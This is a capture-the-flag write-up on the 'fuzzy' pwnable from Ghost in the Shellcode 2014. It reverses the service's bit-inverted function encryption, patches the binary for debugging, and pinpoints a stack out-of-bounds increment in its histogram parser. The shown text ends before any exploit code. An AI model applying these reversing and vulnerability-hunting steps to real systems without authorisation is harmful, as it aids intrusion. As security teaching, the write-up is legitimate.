---
id: 1833
title: 'Ghost in the Shellcode: fuzzy (Pwnage 301)'
date: '2014-04-07T09:41:26-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2014/1817-revision-v1'
permalink: '/?p=1833'
---

Hey folks,

It's a little bit late coming, but this is my writeup for the Fuzzy level from the [Ghost in the Shellcode 2014](https://blog.skullsecurity.org/category/ctfs/gits2014) CTF! I kept putting off writing this, to the point where it became hard to just sit down and do it. But I really wanted to finish before PlaidCTF 2014, which is this weekend so here we are! You can see my other two writeups [here (TI-1337)](https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100) and [here (gitsmsg)](https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-gitsmsg-pwnage-299).

Like my other writeups, this is a "pwnage" level, and required the user to own a remote server. Unfortunately, because of my slowness, they're no longer running the server, but you can get a copy of the binary at [my github page](https://github.com/iagox86/gits-2014/tree/master/fuzzy) and run it yourself. It's a 64-bit Linux ELF executable. It didn't have ASLR, and DEP would have been

## The setup

The service itself was a fairly simple calculator application, the kind you might make in a Computer Science 101 course. For example:

```

<span class="lnr"> 1 </span>$ nc -vv localhost <span class="Constant">4141</span>
<span class="lnr"> 2 </span>localhost [<span class="Constant">127.0.0.1</span>] <span class="Constant">4141</span> (?) open
<span class="lnr"> 3 </span>Welcome to the <span class="Type">super</span> secure parsing engine!
<span class="lnr"> 4 </span>Please select a parser!
<span class="lnr"> 5 </span>
<span class="lnr"> 6 </span><span class="Constant">1</span><span class="Error">)</span> Sentence histogram
<span class="lnr"> 7 </span><span class="Constant">2</span><span class="Error">)</span> Sorted characters (ascending)
<span class="lnr"> 8 </span><span class="Constant">3</span><span class="Error">)</span> Sorted characters (decending)
<span class="lnr"> 9 </span><span class="Constant">4</span><span class="Error">)</span> Sorted ints (ascending)
<span class="lnr">10 </span><span class="Constant">5</span><span class="Error">)</span> Sorted ints (decending
<span class="lnr">11 </span><span class="Constant">6</span>) global_find numbers in string
<span class="lnr">12 </span><span class="Constant">2</span>
<span class="lnr">13 </span>Enter a series of characters to check <span class="Statement">if</span> it's sorted
<span class="lnr">14 </span>This is a test string
<span class="lnr">15 </span>is NOT sorted
```

Or the histogram function:

```

<span class="lnr"> 1 </span><span class="perlVarPlain">$</span> nc -vv localhost <span class="Constant">4141</span>
<span class="lnr"> 2 </span>localhost [<span class="Constant">127.0.0.1</span>] <span class="Constant">4141</span> (?) <span class="perlStatementFileDesc">open</span>
<span class="lnr"> 3 </span>Welcome to the super secure parsing engine!
<span class="lnr"> 4 </span>Please <span class="perlStatementFileDesc">select</span> a parser!
<span class="lnr"> 5 </span>
<span class="lnr"> 6 </span><span class="Constant">1</span>) Sentence histogram
<span class="lnr"> 7 </span><span class="Constant">2</span>) Sorted characters (ascending)
<span class="lnr"> 8 </span><span class="Constant">3</span>) Sorted characters (decending)
<span class="lnr"> 9 </span><span class="Constant">4</span>) Sorted ints (ascending)
<span class="lnr">10 </span><span class="Constant">5</span>) Sorted ints (decending
<span class="lnr">11 </span><span class="Constant">6</span>) global_find numbers in string
<span class="lnr">12 </span><span class="Constant">1</span>
<span class="lnr">13 </span>Enter a series of characters
<span class="lnr">14 </span>This is histrogram
<span class="lnr">15 </span> :<span class="Constant">2</span>     !:<span class="Constant">0</span>     <span class="Constant">"</span><span class="Constant">:0     #:0     </span><span class="perlVarPlain">$</span><span class="Constant">:0</span>
<span class="lnr">16 </span><span class="Constant"> %:0     &:0     ':0     (:0     ):0</span>
<span class="lnr">17 </span><span class="Constant"> *:0     +:0     ,:0     -:0     .:0</span>
<span class="lnr">18 </span><span class="Constant"> /:0     0:0     1:0     2:0     3:0</span>
<span class="lnr">19 </span><span class="Constant"> 4:0     5:0     6:0     7:0     8:0</span>
<span class="lnr">20 </span><span class="Constant"> 9:0     ::0     ;:0     <:0     =:0</span>
<span class="lnr">21 </span><span class="Constant"> >:0     ?:0     @:0     A:0     B:0</span>
<span class="lnr">22 </span><span class="Constant"> C:0     D:0     E:0     F:0     G:0</span>
<span class="lnr">23 </span><span class="Constant"> H:0     I:0     J:0     K:0     L:0</span>
<span class="lnr">24 </span><span class="Constant"> M:0     N:0     O:0     P:0     Q:0</span>
<span class="lnr">25 </span><span class="Constant"> R:0     S:0     T:1     U:0     V:0</span>
<span class="lnr">26 </span><span class="Constant"> W:0     X:0     Y:0     Z:0     [:0</span>
<span class="lnr">27 </span><span class="Constant"> </span><span class="Special">\:</span><span class="Constant">0     ]:0     ^:0     _:0     `:0</span>
<span class="lnr">28 </span><span class="Constant"> a:1     b:0     c:0     d:0     e:0</span>
<span class="lnr">29 </span><span class="Constant"> f:0     g:1     h:2     i:3     j:0</span>
<span class="lnr">30 </span><span class="Constant"> k:0     l:0     m:1     n:0     o:1</span>
<span class="lnr">31 </span><span class="Constant"> p:0     q:0     r:2     s:3     t:1</span>
<span class="lnr">32 </span><span class="Constant"> u:0     v:0     w:0     x:0     y:0</span>
<span class="lnr">33 </span><span class="Constant"> z:0     {:0     |:0     }:0</span>
```

Straight forward!

## Code security

The blurb for the application mentioned their unbreakable security wrapper. Sounds interesting, but what's that even mean? Well, if you open up the code in IDA and poke around a bit, you'll find that after opening a socket and accepting a connection, it forks and calls handleConnection():

```

<span class="Statement">.text</span>:<span class="Constant">004014C1</span> <span class="Identifier">handleConnection</span> <span class="Identifier">proc</span> <span class="Identifier">near</span>              <span class="Comment">; DATA XREF: main+3Bo</span>
<span class="Statement">.text</span>:<span class="Constant">004014C1</span>
<span class="Statement">.text</span>:<span class="Constant">004014C1</span> <span class="Identifier">var_4</span>           = <span class="Identifier">dword</span> <span class="Identifier">ptr</span> -<span class="Constant">4</span>
<span class="Statement">.text</span>:<span class="Constant">004014C1</span>
<span class="Statement">.text</span>:<span class="Constant">004014C1</span>                 <span class="Identifier">push</span>    <span class="Identifier">rbp</span>
<span class="Statement">.text</span>:<span class="Constant">004014C2</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rbp</span>, <span class="Identifier">rsp</span>
<span class="Statement">.text</span>:<span class="Constant">004014C5</span>                 <span class="Identifier">sub</span>     <span class="Identifier">rsp</span>, <span class="Constant">10</span><span class="Identifier">h</span>
<span class="Statement">.text</span>:<span class="Constant">004014C9</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">var_4</span>], <span class="Identifier">edi</span> <span class="Comment">; var_4 = socket</span>
<span class="Statement">.text</span>:<span class="Constant">004014CC</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Constant">0</span>
<span class="Statement">.text</span>:<span class="Constant">004014D1</span>                 <span class="Identifier">call</span>    <span class="Identifier">initFunctions</span>   <span class="Comment">; Store pointers to a bunch of functions</span>
<span class="Statement">.text</span>:<span class="Constant">004014D6</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">var_4</span>]
<span class="Statement">.text</span>:<span class="Constant">004014D9</span>                 <span class="Identifier">mov</span>     <span class="Identifier">dword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">48</span><span class="Identifier">h</span>, <span class="Identifier">eax</span>
<span class="Statement">.text</span>:<span class="Constant">004014DF</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">20</span><span class="Identifier">h</span> <span class="Comment">; rax = callFunction</span>
<span class="Statement">.text</span>:<span class="Constant">004014E6</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdx</span>, <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">68</span><span class="Identifier">h</span> <span class="Comment">; rdx = intro</span>
<span class="Statement">.text</span>:<span class="Constant">004014ED</span>                 <span class="Identifier">lea</span>     <span class="Identifier">rcx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">var_4</span>]
<span class="Statement">.text</span>:<span class="Constant">004014F1</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rsi</span>, <span class="Identifier">rcx</span>        <span class="Comment">; socket</span>
<span class="Statement">.text</span>:<span class="Constant">004014F4</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rdx</span>        <span class="Comment">; function</span>
<span class="Statement">.text</span>:<span class="Constant">004014F7</span>                 <span class="Identifier">call</span>    <span class="Identifier">rax</span>             <span class="Comment">; callFunction</span>
<span class="Statement">.text</span>:<span class="Constant">004014F9</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, <span class="Constant">0</span>
<span class="Statement">.text</span>:<span class="Constant">004014FE</span>                 <span class="Identifier">leave</span>
<span class="Statement">.text</span>:<span class="Constant">004014FF</span>                 <span class="Identifier">retn</span>
```

initFunctions() looks like this:

```

<span class="Statement">.text</span>:<span class="Constant">00401627</span> <span class="Identifier">initFunctions</span>   <span class="Identifier">proc</span> <span class="Identifier">near</span>               <span class="Comment">; CODE XREF: handleConnection+10h.text:00401627                 push    rbp</span>
<span class="Statement">.text</span>:<span class="Constant">00401628</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rbp</span>, <span class="Identifier">rsp</span>
<span class="Statement">.text</span>:<span class="Constant">0040162B</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>, <span class="Identifier">offset</span> <span class="Identifier">_puts</span>
<span class="Statement">.text</span>:<span class="Constant">00401636</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">8</span>, <span class="Identifier">offset</span> <span class="Identifier">_getchar</span>
<span class="Statement">.text</span>:<span class="Constant">00401641</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">10</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">_send</span>
<span class="Statement">.text</span>:<span class="Constant">0040164C</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">18</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">_recv</span>
<span class="Statement">.text</span>:<span class="Constant">00401657</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">20</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">callFunction</span>
<span class="Statement">.text</span>:<span class="Constant">00401662</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">28</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">_strlen</span>
<span class="Statement">.text</span>:<span class="Constant">0040166D</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">30</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">_memset</span>
<span class="Statement">.text</span>:<span class="Constant">00401678</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">38</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">_sprintf</span>
<span class="Statement">.text</span>:<span class="Constant">00401683</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">40</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">_atoi</span>
<span class="Statement">.text</span>:<span class="Constant">0040168E</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">50</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">my_sendAll</span>
<span class="Statement">.text</span>:<span class="Constant">00401699</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">58</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">my_readAll</span>
<span class="Statement">.text</span>:<span class="Constant">004016A4</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">60</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">my_readUntil</span>
<span class="Statement">.text</span>:<span class="Constant">004016AF</span>                 <span class="Identifier">mov</span>     <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">68</span><span class="Identifier">h</span>, <span class="Identifier">offset</span> <span class="Identifier">intro</span>
...and so on.
```

Thankfully, there are symbols! There might be one or two that I named, but the rest were all symbols that were embedded into the executable. I actually made a struct in IDA that had all the functions listed with their offsets from global\_f, which made it easy to see what was being called later.

The functions themselves pointed to what looks like encrypted/compressed code:

```

.data:<span class="Constant">006034E0</span> isSorted        db 0AAh, 0B7h, 76h, 1Ah, 0B7h, 7Eh, 13h, 8Fh, 0FEh, <span class="Constant">2</span> dup(0FFh)
.data:<span class="Constant">006034E0</span>                                         ; DATA XREF: initFunctions+9Eo
.data:<span class="Constant">006034E0</span>                 db 0B7h, 76h, 42h, 67h, <span class="Constant">1</span>, <span class="Constant">2</span> dup(<span class="Constant">0</span>), 9Bh, 0B7h, 74h, 0FBh
.data:<span class="Constant">006034E0</span>                 db 0DAh, 0D7h, <span class="Constant">3</span> dup(0FFh), 0B7h, 76h, 0BAh, <span class="Constant">7</span>, 0CEh, 3Fh
.data:<span class="Constant">006034E0</span>                 db 0B7h, 74h, 7Ah, 67h, <span class="Constant">1</span>, <span class="Constant">2</span> dup(<span class="Constant">0</span>), 74h, 0BFh, 0B7h, 76h
.data:<span class="Constant">006034E0</span>                 db 7Ah, 4Fh, <span class="Constant">1</span>, <span class="Constant">2</span> dup(<span class="Constant">0</span>), 0B7h, 74h, 7Ah, 67h, <span class="Constant">1</span>, <span class="Constant">2</span> dup(<span class="Constant">0</span>
...
```

So, almost every function is obscured in some way. I can work with this!

In the handleConnection() function, the only call after initFunctions() is:

```

<span class="Statement">.text</span>:<span class="Constant">004014DF</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rax</span>, <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">20</span><span class="Identifier">h</span> <span class="Comment">; rax = callFunction</span>
<span class="Statement">.text</span>:<span class="Constant">004014E6</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdx</span>, <span class="Identifier">qword</span> <span class="Identifier">ptr</span> <span class="Identifier">cs</span>:<span class="Identifier">global_f</span>+<span class="Constant">68</span><span class="Identifier">h</span> <span class="Comment">; rdx = intro</span>
<span class="Statement">.text</span>:<span class="Constant">004014ED</span>                 <span class="Identifier">lea</span>     <span class="Identifier">rcx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">var_4</span>]
<span class="Statement">.text</span>:<span class="Constant">004014F1</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rsi</span>, <span class="Identifier">rcx</span>        <span class="Comment">; socket</span>
<span class="Statement">.text</span>:<span class="Constant">004014F4</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rdx</span>        <span class="Comment">; function</span>
<span class="Statement">.text</span>:<span class="Constant">004014F7</span>                 <span class="Identifier">call</span>    <span class="Identifier">rax</span>             <span class="Comment">; callFunction</span>
```

Let's have a look at callFunction() (I'll shorten this to just the super important stuff, grab the file from github if you want a complete listing):

```

<span class="Statement">.text</span>:<span class="Constant">004015BB</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, <span class="Constant">7</span>          <span class="Comment">; prot</span>
<span class="Statement">.text</span>:<span class="Constant">004015C0</span>                 <span class="Identifier">mov</span>     <span class="Identifier">esi</span>, <span class="Constant">514</span><span class="Identifier">h</span>       <span class="Comment">; len</span>
<span class="Statement">.text</span>:<span class="Constant">004015CA</span>                 <span class="Identifier">call</span>    <span class="Identifier">_mmap</span>           <span class="Comment">; Allocate executable memory</span>
<span class="Statement">.text</span>:<span class="Constant">004015DB</span>                 <span class="Identifier">mov</span>     <span class="Identifier">edx</span>, <span class="Constant">514</span><span class="Identifier">h</span>       <span class="Comment">; n</span>
<span class="Statement">.text</span>:<span class="Constant">004015E0</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rsi</span>, <span class="Identifier">rcx</span>        <span class="Comment">; src = the encrypted memory</span>
<span class="Statement">.text</span>:<span class="Constant">004015E3</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; dest = the allocated memory</span>
<span class="Statement">.text</span>:<span class="Constant">004015E6</span>                 <span class="Identifier">call</span>    <span class="Identifier">_memcpy</span>
<span class="Statement">.text</span>:<span class="Constant">004015EF</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; data = allocated memory</span>
<span class="Statement">.text</span>:<span class="Constant">004015F2</span>                 <span class="Identifier">call</span>    <span class="Identifier">decryptFunction</span>
<span class="Statement">.text</span>:<span class="Constant">0040160C</span>                 <span class="Identifier">call</span>    <span class="Identifier">rdx</span>             <span class="Comment">; the allocated memory</span>
<span class="Statement">.text</span>:<span class="Constant">0040161A</span>                 <span class="Identifier">mov</span>     <span class="Identifier">rdi</span>, <span class="Identifier">rax</span>        <span class="Comment">; the alocated memory</span>
<span class="Statement">.text</span>:<span class="Constant">0040161D</span>                 <span class="Identifier">call</span>    <span class="Identifier">_munmap</span>
<span class="Statement">.text</span>:<span class="Constant">00401626</span>                 <span class="Identifier">retn</span>
```

Basically, allocate 0x514 bytes, copy the encrypted code into it, decrypt it, run it, unmap it.

The last step is to look at decryptFunction() - once again, I'm going to leave out unimportant lines:

```

<span class="Statement">.text</span>:<span class="Constant">0040151A</span> <span class="Identifier">loop_top</span>:                               <span class="Comment">; CODE XREF: decryptFunction+90j</span>
<span class="Statement">.text</span>:<span class="Constant">00401534</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">edx</span>, <span class="Identifier">byte</span> <span class="Identifier">ptr</span> [<span class="Identifier">rdx</span>] <span class="Comment">; edx = current character</span>
<span class="Statement">.text</span>:<span class="Constant">00401537</span>                 <span class="Identifier">not</span>     <span class="Identifier">edx</span>             <span class="Comment">; edx = current character inverted</span>
<span class="Statement">.text</span>:<span class="Constant">00401539</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rax</span>], <span class="Identifier">dl</span>       <span class="Comment">; invert the current character</span>
<span class="Statement">.text</span>:<span class="Constant">00401583</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">eax</span>, <span class="Identifier">byte</span> <span class="Identifier">ptr</span> [<span class="Identifier">rax</span>] <span class="Comment">; eax -> current byte</span>
<span class="Statement">.text</span>:<span class="Constant">00401586</span>                 <span class="Identifier">cmp</span>     <span class="Identifier">al</span>, 0<span class="Identifier">C3h</span>        <span class="Comment">; Stop if we reach a 'ret'</span>
<span class="Statement">.text</span>:<span class="Constant">00401588</span>                 <span class="Identifier">jnz</span>     <span class="Identifier">short</span> <span class="Identifier">loop_bottom</span>
<span class="Statement">.text</span>:<span class="Constant">0040158A</span>                 <span class="Identifier">jmp</span>     <span class="Identifier">short</span> <span class="Identifier">done</span>
<span class="Statement">.text</span>:<span class="Constant">0040158C</span> <span class="Comment">; ---------------------------------------------------------------------------</span>
<span class="Statement">.text</span>:<span class="Constant">0040158C</span>
<span class="Statement">.text</span>:<span class="Constant">0040158C</span> <span class="Identifier">loop_bottom</span>:                            <span class="Comment">; CODE XREF: decryptFunction+6Ej</span>
<span class="Statement">.text</span>:<span class="Constant">0040158C</span>                                         <span class="Comment">; decryptFunction+74j ...</span>
<span class="Statement">.text</span>:<span class="Constant">0040158C</span>                 <span class="Identifier">add</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">counter</span>], <span class="Constant">1</span>
<span class="Statement">.text</span>:<span class="Constant">00401590</span>                 <span class="Identifier">jmp</span>     <span class="Identifier">short</span> <span class="Identifier">loop_top</span>
<span class="Statement">.text</span>:<span class="Constant">00401592</span> <span class="Comment">; ---------------------------------------------------------------------------</span>
<span class="Statement">.text</span>:<span class="Constant">00401592</span>
<span class="Statement">.text</span>:<span class="Constant">00401592</span> <span class="Identifier">done</span>:                                   <span class="Comment">; CODE XREF: decryptFunction+8Aj</span>
<span class="Statement">.text</span>:<span class="Constant">00401592</span>                 <span class="Identifier">mov</span>     <span class="Identifier">eax</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">counter</span>]
<span class="Statement">.text</span>:<span class="Constant">00401595</span>                 <span class="Identifier">add</span>     <span class="Identifier">eax</span>, <span class="Constant">1</span>
<span class="Statement">.text</span>:<span class="Constant">00401598</span>                 <span class="Identifier">leave</span>
<span class="Statement">.text</span>:<span class="Constant">00401599</span>                 <span class="Identifier">retn</span>
```

Effectively, this inverts every character until it reaches a return (0xc3). Essentially XORing with 0xFF. One thing I don't show here is that it won't end until after a sequence of five NOPs are found (the code was a little complicated, and I didn't want to get lost in the details).

To summarize this section, there is a global table that holds pointers to functions that are encrypted by inverting all bits. The table is initialized in initFunctions(), and the functions are accessed using callFunction(). When callFunction() is called, the function is decrypted into some freshly allocated memory, run, then the memory is freed. So if we can get our own encrypted code into the right place......

## Decrypting

To make reversing easier, I wrote a quick ruby script that will decrypt the functions in place:

```

fuzzy = <span class="Special">""</span>
<span class="Type">File</span>.open(<span class="Special">"</span><span class="Constant">fuzzy</span><span class="Special">"</span>, <span class="Special">"</span><span class="Constant">r</span><span class="Special">"</span>) <span class="Statement">do</span> |<span class="Identifier">f</span>|
  fuzzy = f.read(<span class="Constant">33183</span>)
<span class="Statement">end</span>

puts(fuzzy.length)

start = fuzzy.index(<span class="Special">"</span><span class="Special">\xAA\xB7\x76\x1A\xB7\x7C\x13\xDF</span><span class="Special">"</span>)
puts(<span class="Special">"</span><span class="Constant">start = %x</span><span class="Special">"</span> % start)

start.upto(start + <span class="Constant">0x6041E0</span> - <span class="Constant">0x602160</span> - <span class="Constant">1</span>) <span class="Statement">do</span> |<span class="Identifier">i</span>|
  fuzzy[i] = (fuzzy[i].ord ^ <span class="Constant">0xFF</span>).chr
<span class="Statement">end</span>

<span class="Type">File</span>.open(<span class="Special">"</span><span class="Constant">fuzzy-decrypted</span><span class="Special">"</span>, <span class="Special">"</span><span class="Constant">w</span><span class="Special">"</span>) <span class="Statement">do</span> |<span class="Identifier">f</span>|
  f.write(fuzzy)
<span class="Statement">end</span>
```

The output file is [fuzzy-decrypted](https://github.com/iagox86/gits-2014/blob/master/fuzzy/fuzzy-decrypted), which you can find on the github repository. [fuzzy-decrypted.i64](https://github.com/iagox86/gits-2014/blob/master/fuzzy/fuzzy-decrypted.i64) contains the majority of my comments.

This version of the executable won't run, of course, because it tries to decrypt the already-decrypted data. The easy way to fix this would be to remove the single call to 'not', and everything else would work as expected. I didn't think of that at the time, however, and NOPed out the entire decryption portion. Here is a diff I generated with objdump + diff, note that the syntax will be slightly different than IDA:

```

 0040159a <callFunction>:
<span class="Special">-  40159a:      55                      push   rbp</span>
<span class="Special">-  40159b:      48 89 e5                mov    rbp,rsp</span>
<span class="Special">-  40159e:      48 83 ec 20             sub    rsp,0x20</span>
<span class="Special">-  4015a2:      48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi</span>
<span class="Special">-  4015a6:      48 89 75 e0             mov    QWORD PTR [rbp-0x20],rsi</span>
<span class="Statement">+  40159a:      48 89 f8                mov    rax,rdi</span>
<span class="Statement">+  40159d:      bf e0 47 60 00          mov    edi,0x6047e0</span>
<span class="Statement">+  4015a2:      ff d0                   call   rax</span>
<span class="Statement">+  4015a4:      c3                      ret</span>
<span class="Statement">+  4015a5:      90                      nop</span>
<span class="Statement">+  4015a6:      48 89 7d e8             mov    QWORD PTR [rbp-0x18],rdi</span>
   4015aa:      41 b9 00 00 00 00       mov    r9d,0x0
   4015b0:      41 b8 ff ff ff ff       mov    r8d,0xffffffff
   4015b6:      b9 22 00 00 00          mov    ecx,0x22
```

Basically, remove the actual function lead-in, and replace it with a call directly to the function.

The final change I made to the executable was to disable the fork() and alarm() functions, as I discussed in [previous posts](/2014/ghost-in-the-shellcode-ti-1337-pwnable-100). In the objdump diff, it looks like this:

```

   401098:      83 7d f4 ff             cmp    DWORD PTR [rbp-0xc],0xffffffff
   40109c:      75 02                   jne    4010a0 <loop+0x3d>
   40109e:      eb 65                   jmp    401105 <loop+0xa2>
<span class="Special">-  4010a0:      e8 fb fc ff ff          call   400da0 <fork@plt></span>
<span class="Statement">+  4010a0:      48 31 c0                xor    rax,rax</span>
<span class="Statement">+  4010a3:      90                      nop</span>
<span class="Statement">+  4010a4:      90                      nop</span>
   4010a5:      89 45 f8                mov    DWORD PTR [rbp-0x8],eax
   4010a8:      83 7d f8 ff             cmp    DWORD PTR [rbp-0x8],0xffffffff
   4010ac:      75 02                   jne    4010b0 <loop+0x4d>
<span class="Identifier">@@ -1220,7 +1222,11 @@</span>
   4010b0:      83 7d f8 00             cmp    DWORD PTR [rbp-0x8],0x0
   4010b4:      75 45                   jne    4010fb <loop+0x98>
   4010b6:      bf 1e 00 00 00          mov    edi,0x1e
<span class="Special">-  4010bb:      e8 b0 fb ff ff          call   400c70 <alarm@plt></span>
<span class="Statement">+  4010bb:      90                      nop</span>
<span class="Statement">+  4010bc:      90                      nop</span>
<span class="Statement">+  4010bd:      90                      nop</span>
<span class="Statement">+  4010be:      90                      nop</span>
<span class="Statement">+  4010bf:      90                      nop</span>
   4010c0:      48 8b 05 89 10 20 00    mov    rax,QWORD PTR [rip+0x201089]        # 602150 <USER>
   4010c7:      48 89 c7                mov    rdi,rax
   4010ca:      e8 43 00 00 00          call   401112 <drop_privs_user>
<span class="Identifier">@@ -1584,11 +1590,12 @@</span>
   401599:      c3                      ret
```

The file, with everything decrypted, can be found under [fuzzy-decrypted-fixed](https://github.com/iagox86/gits-2014/blob/master/fuzzy/fuzzy-decrypted-fixed) on github.

## The vulnerability

In spite of the name - fuzzy - implying that I should probably fuzz, I decided that now that I had the code decrypted I would just look for the vuln manually. I'm also a contrarian, which these days people are calling "first world anarchists". You can't tell ME what to do! :)

Anyway, I decided to reverse the 6 different parsers in a completely random and arbitrary order, based on what looked easiest to understand. As a reminder, here are the possible parsers:

1\) Sentence histogram  
2\) Sorted characters (ascending)  
3\) Sorted characters (decending)  
4\) Sorted ints (ascending)  
5\) Sorted ints (decending  
6\) global\_find numbers in string

I won't go into details of the ones that weren't vulnerable; instead, we'll look at the first one - Sentence Histrogram. Sentence Histogram calls charHistogram(), which is a rather long function. Essentially, it creates an array of bytes, with one array entry per letter, then loops through the screen and increments the appropriate letter. Something like:

```

<span class="Type">char</span> str[<span class="Constant">0x80</span>];
<span class="Statement">for</span>(i = <span class="Constant">0</span>; i < strlen(input); i++) {
  str[input[i]]++;
}
```

Here's the actual code, abridged:

```

<span class="Statement">.data</span>:<span class="Constant">006031DD</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">eax</span>, <span class="Identifier">byte</span> <span class="Identifier">ptr</span> [<span class="Identifier">rax</span>] <span class="Comment">; eax = current_character</span>
<span class="Statement">.data</span>:<span class="Constant">006031E0</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">eax</span>, <span class="Identifier">al</span>
<span class="Statement">.data</span>:<span class="Constant">006031E3</span>                 <span class="Identifier">movsxd</span>  <span class="Identifier">rdx</span>, <span class="Identifier">eax</span>
<span class="Statement">.data</span>:<span class="Constant">006031E6</span>                 <span class="Identifier">movzx</span>   <span class="Identifier">edx</span>, [<span class="Identifier">rbp</span>+<span class="Identifier">rdx</span>+<span class="Identifier">buffer_88_bytes</span>] <span class="Comment">; edx = buffer_88_bytes[current_character]</span>
<span class="Statement">.data</span>:<span class="Constant">006031EE</span>                 <span class="Identifier">add</span>     <span class="Identifier">edx</span>, <span class="Constant">1</span>          <span class="Comment">; Increment that index in the 88-byte buffer</span>
<span class="Statement">.data</span>:<span class="Constant">006031F1</span>                 <span class="Identifier">cdqe</span>
<span class="Statement">.data</span>:<span class="Constant">006031F3</span>                 <span class="Identifier">mov</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">rax</span>+<span class="Identifier">buffer_88_bytes</span>], <span class="Identifier">dl</span> <span class="Comment">; <--- VULN</span>
<span class="Statement">.data</span>:<span class="Constant">006031FA</span>                 <span class="Identifier">add</span>     [<span class="Identifier">rbp</span>+<span class="Identifier">counter</span>], <span class="Constant">1</span>
```

Due to a lack of input validation, if your string contains bytes with a value of at least 0x88 ('\\x88'), you can increment not only values in the actual array, but values stored up to 0xFF bytes from the start of the array. Oops! Since the array happens to be on the stack, we can control the entire stack frame, to an extent (unfortunately, we only get a couple hundred characters, so we can't, for example, change all bytes of a 64-bit pointer in a meaningful way).

## Madness lies here

